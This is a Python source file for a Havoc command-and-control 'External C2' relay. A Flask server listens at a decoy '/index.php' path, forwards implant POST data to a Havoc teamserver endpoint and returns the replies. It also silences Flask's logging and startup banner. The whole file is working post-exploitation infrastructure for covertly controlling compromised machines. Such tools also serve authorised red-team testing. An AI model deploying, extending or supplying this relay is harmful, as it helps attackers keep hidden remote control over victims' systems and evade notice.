from havoc.externalc2 import ExternalC2
from flask import Flask, request

import logging
import sys

externalc2 = ExternalC2( "http://127.0.0.1:40056/ExtEndpoint" )

FlaskApp: Flask = Flask(__name__)

# shut flask output up
log = logging.getLogger('werkzeug')
log.disabled = True
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None


# ====== Flask C2 Server ======
@FlaskApp.route("/index.php", methods=['POST'])
def ec2_index():
    if request.method == 'POST':
        data = request.get_data()

        if len(data) > 0:
            print(f"data[{len(data)}]: {data.hex()}")
            respond = externalc2.transmit(data)
            print(f"respond[{len(respond)}]: {respond.hex()}")
            return respond

    return ''


def StartFlaskServer():

    print("[*] Start Flask HTTP server")
    FlaskApp.run(host="192.168.0.148", port=8888, debug=True, use_reloader=False)

    return


# ===== Main ======
def main() -> None:
    print("[*] External C2 [written by @C5pider for Havoc]")

    StartFlaskServer()

    return


if __name__ == '__main__':
    main()
